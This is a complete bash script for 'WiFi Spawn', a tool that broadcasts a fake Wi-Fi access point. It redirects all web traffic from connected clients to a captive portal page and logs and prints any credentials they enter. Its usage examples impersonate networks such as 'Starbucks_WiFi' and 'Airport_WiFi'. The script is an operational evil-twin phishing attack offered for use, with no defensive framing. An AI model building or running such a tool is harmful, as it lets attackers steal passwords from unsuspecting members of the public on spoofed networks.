#!/bin/bash

# WiFi Spawn - Fake Access Point with Captive Portal
# Usage: sudo ./wifispawn.sh <SSID> <interface> [page]

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
SSID="${1:-FreeWiFi}"
INTERFACE="${2:-wlan0}"
PAGE_TYPE="${3:-portal}"
INTERNET_INTERFACE="${4:-}"
GATEWAY_IP="192.168.4.1"
DHCP_RANGE="192.168.4.2,192.168.4.50"
WEB_PORT="80"
CREDS_PORT="8080"

# Internet sharing - DISABLED (single antenna mode)
PROVIDE_INTERNET="false"
AUTO_DETECT_INTERNET="false"
REQUIRE_AUTH_FOR_INTERNET="false"

# Directories
# Get the real script directory (follow symlinks if needed)
if [[ -L "${BASH_SOURCE[0]}" ]]; then
    # Script is a symlink, follow it
    SCRIPT_PATH="$(readlink -f "${BASH_SOURCE[0]}" 2>/dev/null || readlink "${BASH_SOURCE[0]}")"
    SCRIPT_DIR="$(dirname "$SCRIPT_PATH")"
else
    # Script is not a symlink
    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
fi

# Try to find pages directory
if [[ -d "$SCRIPT_DIR/pages" ]]; then
    PAGES_DIR="$SCRIPT_DIR/pages"
elif [[ -d "/opt/wifispawn/pages" ]]; then
    PAGES_DIR="/opt/wifispawn/pages"
else
    # Last resort: check current directory
    PAGES_DIR="$(pwd)/pages"
fi

WORK_DIR="/tmp/wifispawn"
WEB_DIR="$WORK_DIR/www"
LOGS_DIR="$WORK_DIR/logs"

# Files
HOSTAPD_CONF="$WORK_DIR/hostapd.conf"
DNSMASQ_CONF="$WORK_DIR/dnsmasq.conf"
CREDS_FILE="$LOGS_DIR/credentials.log"

print_banner() {
    echo -e "${GREEN}"
    echo "██╗    ██╗██╗███████╗██╗███████╗██████╗  █████╗ ██╗    ██╗███╗   ██╗"
    echo "██║    ██║██║██╔════╝██║██╔════╝██╔══██╗██╔══██╗██║    ██║████╗  ██║"
    echo "██║ █╗ ██║██║█████╗  ██║███████╗██████╔╝███████║██║ █╗ ██║██╔██╗ ██║"
    echo "██║███╗██║██║██╔══╝  ██║╚════██║██╔═══╝ ██╔══██║██║███╗██║██║╚██╗██║"
    echo "╚███╔███╔╝██║██║     ██║███████║██║     ██║  ██║╚███╔███╔╝██║ ╚████║"
    echo " ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝"
    echo -e "${NC}"
    echo -e "${YELLOW}Fake Access Point with Captive Portal${NC}"
    echo "=========================================="
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}This script must be run as root${NC}"
        exit 1
    fi
}

list_available_pages() {
    echo -e "${BLUE}Available portal pages:${NC}"
    echo "========================"
    
    if [[ -d "$PAGES_DIR" ]]; then
        for page in "$PAGES_DIR"/*.html; do
            if [[ -f "$page" ]]; then
                local basename=$(basename "$page" .html)
                echo -e "${GREEN}  • $basename${NC} - $(basename "$page")"
            fi
        done
    else
        echo -e "${RED}Pages directory not found: $PAGES_DIR${NC}"
        exit 1
    fi
    
    echo ""
    echo "Usage: $0 <SSID> <INTERFACE> [PAGE]"
    echo "Example: $0 'FreeWiFi' wlan0 starbucks"
}

validate_page() {
    local page_file="$PAGES_DIR/$PAGE_TYPE.html"
    
    if [[ ! -f "$page_file" ]]; then
        echo -e "${RED}Error: Page '$PAGE_TYPE' not found!${NC}"
        echo -e "${RED}File not found: $page_file${NC}"
        echo ""
        list_available_pages
        exit 1
    fi
    
    echo -e "${GREEN}[+] Using portal page: $PAGE_TYPE${NC}"
    return 0
}

# Internet detection removed - operating in portal-only mode with single antenna

# Internet sharing removed - single antenna mode (captive portal only)

check_dependencies() {
    echo -e "${YELLOW}[+] Checking dependencies...${NC}"
    
    local deps=("hostapd" "dnsmasq" "iptables" "python3")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [[ ${#missing[@]} -ne 0 ]]; then
        echo -e "${RED}Missing dependencies: ${missing[*]}${NC}"
        echo "Install with: apt update && apt install -y ${missing[*]}"
        exit 1
    fi
    
    echo -e "${GREEN}[+] All dependencies found${NC}"
}

setup_directories() {
    echo -e "${YELLOW}[+] Setting up directories...${NC}"
    
    mkdir -p "$WORK_DIR" "$WEB_DIR" "$LOGS_DIR"
    touch "$CREDS_FILE"
    
    # Copy selected portal page
    local source_page="$PAGES_DIR/$PAGE_TYPE.html"
    if [[ -f "$source_page" ]]; then
        cp "$source_page" "$WEB_DIR/portal.html"
        echo -e "${GREEN}[+] Portal page copied: $PAGE_TYPE${NC}"
    else
        echo -e "${RED}Error: Portal page not found: $source_page${NC}"
        exit 1
    fi
    
    # Copy index.html if it exists
    if [[ -f "$PAGES_DIR/index.html" ]]; then
        cp "$PAGES_DIR/index.html" "$WEB_DIR/index.html"
    fi
    
    # Copy captive portal detection files
    for file in hotspot-detect.html generate_204.html ncsi.txt connecttest.txt success.txt; do
        if [[ -f "$PAGES_DIR/$file" ]]; then
            cp "$PAGES_DIR/$file" "$WEB_DIR/$file"
        fi
    done
    
    echo -e "${GREEN}[+] Directories created${NC}"
}

cleanup() {
    echo -e "\n${YELLOW}[+] Cleaning up...${NC}"
    
    # Stop services
    killall hostapd 2>/dev/null || true
    killall dnsmasq 2>/dev/null || true
    killall python3 2>/dev/null || true
    
    # Restore iptables from backup if available
    if [[ -f "$LOGS_DIR/iptables.backup" ]]; then
        echo -e "${YELLOW}[+] Restoring iptables rules...${NC}"
        iptables-restore < "$LOGS_DIR/iptables.backup" 2>/dev/null || {
            echo -e "${YELLOW}[!] Could not restore iptables backup, clearing rules...${NC}"
            iptables -F
            iptables -X
            iptables -t nat -F
            iptables -t nat -X
        }
    else
        # Fallback: clear all rules
        iptables -F
        iptables -X
        iptables -t nat -F
        iptables -t nat -X
    fi
    
    # Restore interface
    ip addr flush dev "$INTERFACE"
    ip link set "$INTERFACE" down
    
    echo -e "${GREEN}[+] Cleanup completed${NC}"
    exit 0
}

setup_interface() {
    echo -e "${YELLOW}[+] Setting up wireless interface...${NC}"
    
    # Kill conflicting processes
    echo -e "${BLUE}[+] Stopping conflicting processes...${NC}"
    airmon-ng check kill 2>/dev/null || true
    killall wpa_supplicant 2>/dev/null || true
    killall dhclient 2>/dev/null || true
    
    # If interface is in monitor mode, disable it first
    if iwconfig "$INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
        echo -e "${YELLOW}[+] Disabling monitor mode on $INTERFACE${NC}"
        airmon-ng stop "$INTERFACE" 2>/dev/null || true
        # Update interface name if it changed (e.g., wlan0mon -> wlan0)
        INTERFACE="${INTERFACE%%mon}"
    fi
    
    # Reset interface
    ip link set "$INTERFACE" down 2>/dev/null || true
    ip addr flush dev "$INTERFACE" 2>/dev/null || true
    
    # Bring interface up in managed mode
    iw dev "$INTERFACE" set type managed 2>/dev/null || true
    
    # Configure interface with static IP
    ip addr add "$GATEWAY_IP/24" dev "$INTERFACE"
    ip link set "$INTERFACE" up
    
    sleep 2
    
    echo -e "${GREEN}[+] Interface $INTERFACE configured (${GATEWAY_IP})${NC}"
}

start_access_point() {
    echo -e "${YELLOW}[+] Starting fake access point...${NC}"
    
    # Start hostapd in background
    hostapd "$HOSTAPD_CONF" &
    sleep 3
    
    echo -e "${GREEN}[+] Access point '$SSID' started${NC}"
}

start_dhcp_dns() {
    echo -e "${YELLOW}[+] Starting DHCP and DNS services...${NC}"
    
    # Start dnsmasq
    dnsmasq -C "$DNSMASQ_CONF" &
    
    echo -e "${GREEN}[+] DHCP and DNS services started${NC}"
}

setup_iptables() {
    echo -e "${YELLOW}[+] Setting up traffic redirection (portal-only mode)...${NC}"
    
    # Backup current iptables rules
    iptables-save > "$LOGS_DIR/iptables.backup" 2>/dev/null || true
    
    # Disable IP forwarding (no internet sharing)
    echo 0 > /proc/sys/net/ipv4/ip_forward
    
    # Clear existing rules
    iptables -F
    iptables -X
    iptables -t nat -F
    iptables -t nat -X
    iptables -t mangle -F
    iptables -t mangle -X
    
    # Set default policies
    iptables -P INPUT ACCEPT
    iptables -P FORWARD DROP
    iptables -P OUTPUT ACCEPT
    
    # Allow loopback
    iptables -A INPUT -i lo -j ACCEPT
    iptables -A OUTPUT -o lo -j ACCEPT
    
    # Allow DNS and DHCP for clients
    iptables -A INPUT -i "$INTERFACE" -p udp --dport 53 -j ACCEPT
    iptables -A INPUT -i "$INTERFACE" -p tcp --dport 53 -j ACCEPT
    iptables -A INPUT -i "$INTERFACE" -p udp --dport 67 -j ACCEPT
    
    # Allow access to web server (portal) and credentials server
    iptables -A INPUT -i "$INTERFACE" -p tcp --dport "$WEB_PORT" -j ACCEPT
    iptables -A INPUT -i "$INTERFACE" -p tcp --dport "$CREDS_PORT" -j ACCEPT
    
    # Redirect all HTTP traffic to captive portal
    iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 80 -j DNAT --to-destination "$GATEWAY_IP:$WEB_PORT"
    iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 443 -j DNAT --to-destination "$GATEWAY_IP:$WEB_PORT"
    
    # Allow established connections
    iptables -A INPUT -i "$INTERFACE" -m state --state ESTABLISHED,RELATED -j ACCEPT
    
    # Drop everything else (no internet access)
    iptables -A FORWARD -i "$INTERFACE" -j DROP
    iptables -A INPUT -i "$INTERFACE" -j DROP
    
    echo -e "${GREEN}[+] Captive portal traffic redirection configured${NC}"
    echo -e "${YELLOW}[!] No internet access - credentials capture only${NC}"
}

start_web_services() {
    echo -e "${YELLOW}[+] Starting web services...${NC}"
    
    # Find and copy Python server to work directory
    local server_found=false
    for search_path in "$SCRIPT_DIR/server.py" "/opt/wifispawn/server.py" "$(pwd)/server.py"; do
        if [[ -f "$search_path" ]]; then
            cp "$search_path" "$WORK_DIR/server.py"
            server_found=true
            break
        fi
    done
    
    if [[ "$server_found" = false ]]; then
        echo -e "${RED}Error: server.py not found!${NC}"
        echo -e "${YELLOW}Searched in: $SCRIPT_DIR, /opt/wifispawn, $(pwd)${NC}"
        exit 1
    fi
    
    # Start credentials server
    cd "$WORK_DIR"
    python3 server.py &
    sleep 2
    
    # Start simple HTTP server for portal page
    cd "$WEB_DIR"
    python3 -m http.server "$WEB_PORT" --bind "$GATEWAY_IP" &>/dev/null &
    
    echo -e "${GREEN}[+] Web services started${NC}"
    echo -e "${GREEN}[+] Captive portal: http://$GATEWAY_IP${NC}"
    echo -e "${GREEN}[+] Credentials will be logged to: $CREDS_FILE${NC}"
}

monitor_credentials() {
    echo -e "${YELLOW}[+] Monitoring for credentials...${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop${NC}"
    
    tail -f "$CREDS_FILE" | while read -r line; do
        if [[ -n "$line" ]]; then
            echo -e "${GREEN}[CREDENTIAL CAPTURED]${NC} $line"
        fi
    done
}

main() {
    # Set up signal handlers
    trap cleanup SIGINT SIGTERM
    
    print_banner
    check_root
    validate_page
    check_dependencies
    
    echo -e "${YELLOW}SSID: $SSID${NC}"
    echo -e "${YELLOW}Interface: $INTERFACE${NC}"
    echo -e "${YELLOW}Portal Page: $PAGE_TYPE${NC}"
    echo -e "${YELLOW}Mode: ${RED}Captive Portal Only${NC} (No Internet)${NC}"
    echo -e "${YELLOW}Gateway: $GATEWAY_IP${NC}"
    echo ""
    
    setup_directories
    
    # Generate configuration files
    local config_script=""
    for search_path in "$SCRIPT_DIR/misc/generate_configs.sh" "/opt/wifispawn/generate_configs.sh" "$(pwd)/misc/generate_configs.sh"; do
        if [[ -f "$search_path" ]]; then
            config_script="$search_path"
            break
        fi
    done
    
    if [[ -z "$config_script" ]]; then
        echo -e "${RED}Error: misc/generate_configs.sh not found!${NC}"
        echo -e "${YELLOW}Searched in: $SCRIPT_DIR, /opt/wifispawn, $(pwd)${NC}"
        exit 1
    fi
    
    "$config_script" "$SSID" "$INTERFACE" "$GATEWAY_IP" "$DHCP_RANGE"
    
    setup_interface
    start_access_point
    start_dhcp_dns
    setup_iptables
    start_web_services
    
    echo -e "\n${GREEN}[+] WiFi Spawn is running!${NC}"
    echo -e "${GREEN}[+] Fake AP '$SSID' is broadcasting${NC}"
    
    monitor_credentials
}

# Check arguments
if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    echo "Usage: $0 [SSID] [INTERFACE] [PAGE]"
    echo "Examples:"
    echo "  $0 'FreeWiFi' wlan0 portal"
    echo "  $0 'Starbucks_WiFi' wlan0 starbucks"
    echo "  $0 'Airport_WiFi' wlan0 airport"
    echo "  $0 '-l or --list-pages' to list available portal pages"
    echo ""
    list_available_pages
    exit 0
fi

if [[ "$1" == "--list-pages" || "$1" == "-l" ]]; then
    list_available_pages
    exit 0
fi

main "$@"